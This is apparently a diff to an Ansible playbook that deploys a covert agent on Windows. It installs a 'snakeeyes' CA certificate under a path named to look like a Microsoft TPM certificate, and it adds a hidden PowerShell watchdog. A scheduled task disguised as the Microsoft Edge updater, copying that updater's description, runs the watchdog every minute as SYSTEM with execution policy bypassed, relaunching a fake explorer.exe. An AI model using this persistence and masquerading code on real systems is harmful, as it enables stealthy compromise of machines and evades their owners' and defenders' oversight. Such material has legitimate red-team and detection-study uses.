@@ -19,21 +19,68 @@
     src: "snakeeyes-ca.crt"
     dest: "C:\\ProgramData\\Microsoft\\Network\\TPMNetworkModuleCertificate\\Microsoft_TPM_Network_DSA_Trust.crt"
 
-- name: Create scheduled task
-  community.windows.win_scheduled_task:
-    name: MicrosoftEdgeUpdateTaskMachineEN
-    description: Keeps your Microsoft software up to date. if this task is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Microsoft software using it.
-    actions:
-      - path: "C:\\Windows\\SystemApps\\Microsoft.Windows.FileExplorer_xyw5h1lvcb\\explorer.exe"
-    triggers:
-      - type: boot
-    username: SYSTEM
-    run_level: highest
-    state: present
-    enabled: true
+- name: Deploy watchdog PowerShell script
+  ansible.windows.win_copy:
+  dest: "C:\\Program Files\\Internet Explorer\\MicrosoftEdgeUpdate.ps1"
+  content: |
+    $exePath = 'C:\\Windows\\SystemApps\\Microsoft.Windows.FileExplorer_xyw5h1lvcb\\explorer.exe'
+    $processName = 'explorer'
 
-- name: Start agent immediately
-  ansible.windows.win_shell: |
-    Start-Process -FilePath "C:\\Windows\\SystemApps\\Microsoft.Windows.FileExplorer_xyw5h1lvcb\\explorer.exe" -WindowStyle Hidden
-  args:
-    executable: powershell.exe
+    if (-not (Test-Path $exePath)) {
+        exit 1
+    }
+
+    $running = Get-Process -Name $processName -ErrorAction SilentlyContinue
+
+    if (-not $running) {
+        Start-Process -FilePath $exePath -WindowStyle Hidden
+    }
+
+- name: Create scheduled task for watchdog
+  ansible.windows.win_powershell:
+    script: |
+      $taskName   = 'MicrosoftEdgeUpdateTaskMachineEN'
+      $scriptPath = 'C:\\Program Files\\Internet Explorer\\MicrosoftEdgeUpdate.ps1'
+
+      $action = New-ScheduledTaskAction `
+        -Execute 'powershell.exe' `
+        -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
+
+      $triggerStartup = New-ScheduledTaskTrigger -AtStartup
+      $triggerLogon   = New-ScheduledTaskTrigger -AtLogOn
+
+      # Repeating every minute forever by using a daily trigger with 1-day duration,
+      # then it renews again the next day.
+      $triggerRepeat = New-ScheduledTaskTrigger -Daily -At 12:00AM
+      $triggerRepeat.Repetition.Interval = 'PT1M'
+      $triggerRepeat.Repetition.Duration = 'P1D'
+      $triggerRepeat.Repetition.StopAtDurationEnd = $false
+
+      $principal = New-ScheduledTaskPrincipal `
+        -UserId 'SYSTEM' `
+        -LogonType ServiceAccount `
+        -RunLevel Highest
+
+      $settings = New-ScheduledTaskSettingsSet `
+        -AllowStartIfOnBatteries `
+        -DontStopIfGoingOnBatteries `
+        -StartWhenAvailable `
+        -Hidden `
+        -ExecutionTimeLimit (New-TimeSpan -Seconds 0)
+
+      # Do not start a new instance if one is already running
+      $settings.MultipleInstances = 2
+
+      Register-ScheduledTask `
+        -TaskName $taskName `
+        -Description 'Keeps your Microsoft software up to date. if this task is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Microsoft software using it.' `
+        -Action $action `
+        -Trigger @($triggerStartup, $triggerLogon, $triggerRepeat) `
+        -Principal $principal `
+        -Settings $settings `
+        -Force
+
+- name: Run watchdog once immediately
+  ansible.windows.win_powershell:
+    script: |
+      powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "C:\\Program Files\\Internet Explorer\\MicrosoftEdgeUpdate.ps1"
